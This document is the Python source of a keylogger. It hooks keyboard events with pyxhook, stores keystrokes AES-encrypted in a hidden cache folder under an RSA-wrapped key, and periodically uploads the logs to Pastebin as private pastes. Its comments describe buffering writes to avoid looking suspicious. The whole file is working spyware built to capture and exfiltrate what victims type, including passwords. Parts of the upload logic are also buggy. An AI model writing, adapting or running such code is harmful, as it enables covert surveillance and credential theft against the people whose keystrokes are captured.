#!/usr/bin/env python
import pastebin_creds
import os, sys, random
import pyxhook
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
from pastebin import PastebinAPI

def log(message, verbose):
    if verbose:
        print(message)

def upload_to_pastebin(name, contents, pb_api, pb_api_key, pb_user_key):
    try:
        url = pb_api.paste(pb_api_key, 
                           contents,
                           paste_name=name,
                           api_user_key=pb_user_key,
                           paste_private='private',
                           paste_expire_date='N')
    except Exception as e:
        log('[*] Uploaded {} file to pastebin: {}'.format(name, e), verbose)

verbose = True if os.environ.get('LOG_VERBOSE', 1) == 1 else False

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_dir = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), '.cache')

log_file = os.path.join(log_dir, str(random.randint(0, 10000)).ljust(5, '0'))

log('[*] LOG_VERBOSE: 1', verbose)
log('[*] LOG_DIR: {}'.format(log_dir), verbose)


# create dirname if it doesn't exist
if not os.path.isdir(log_dir):
    try:
        os.mkdir(log_dir)
        log('[*] Created {}'.format(log_dir), verbose)
    except:
        log('[*] Error creating {}'.format(log_dir), verbose)
        log('[*] Exiting with error code 1', verbose)
        exit(1)

#Crypto-------------------------------------------------------------------------

with open('keys/key.pub', 'r') as f:
    public_key = RSA.importKey(f.read())
    log('[*] Loaded public key from keys/key.pub', verbose)

# create a random AES key
aes_key = Random.new().read(16)
iv = Random.new().read(AES.block_size)
aes_cipher = AES.new(aes_key, AES.MODE_CFB, iv)
log('[*] Generated random {} byte AES key'.format(len(aes_key)), verbose)

# encrypt that random AES key with the public key 
encrypted_aes_key = public_key.encrypt(aes_key, "")[0]
log('[*] AES key encrypted using public key', verbose)

aes_key_filename = '{}_aes'.format(log_file)
with open(aes_key_filename, 'wb') as f:
    f.write(encrypted_aes_key)
    log('[*] Saved encrypted AES key to {}'.format(aes_key_filename), verbose)

with open(log_file, 'w') as f:
    f.write(iv)
    log('[*] Wrote AES initialization vector to {}'.format(log_file), verbose)

#-------------------------------------------------------------------------------

# we don't want to log to file every keypress, because that would be suspicious
# so instead we buffer and flush it to file every 100 keypresses
buff = dict()
buff['buff'] = ''
buff['num_keypresses_between_log_updates'] = 10
buff['num_keypresses_before_upload'] = 10
buff['keypress_log_count'] = 0
buff['keypress_upload_count'] = 0

# some fancy closure to give the hook.KeyDown access to our buff vars
def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
    def onKeyPress(event):
        
        if event.Key == 'Escape':
            exit(0)

        buff['buff'] += '{}\n'.format(event.Key)
        buff['keypress_log_count'] = buff['keypress_log_count'] + 1
        buff['keypress_upload_count'] = buff['keypress_upload_count'] + 1
        if buff['keypress_log_count'] == \
           buff['num_keypresses_between_log_updates']:    
            with open(log_file, 'a') as f:
                f.write(aes_cipher.encrypt(buff['buff']))
            buff['buff'] = ''
            buff['keypress_log_count'] = 0
        if buff['keypress_upload_count'] == \
           buff['num_keypresses_before_upload']:
            with open(log_file, 'r') as f:
                upload_to_pastebin(os.path.basename(
                                        '{}_aes'.format(encrypted_aes_key)), 
                                   f.read(), pb_api, pb_api_key, pb_user_key)
                upload_to_pastebin(os.path.basename(log_file),
                                   f.read(), pb_api, pb_api_key, pb_user_key)
            buff['keypress_upload_count'] = 0

    return onKeyPress

pb_api = PastebinAPI()
pb_user_key = pb_api.generate_user_key(pastebin_creds.api_dev_key, 
                                       pastebin_creds.username, 
                                       pastebin_creds.password)

hook = pyxhook.HookManager()
hook.KeyDown = getOnKeyPress(buff, 
                             pb_api, 
                             pastebin_creds.api_dev_key, 
                             pb_user_key)
hook.HookKeyboard()

try:
    hook.start()
    log('[*] Saving encrypted keystrokes to {}'.format(log_file), verbose)
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
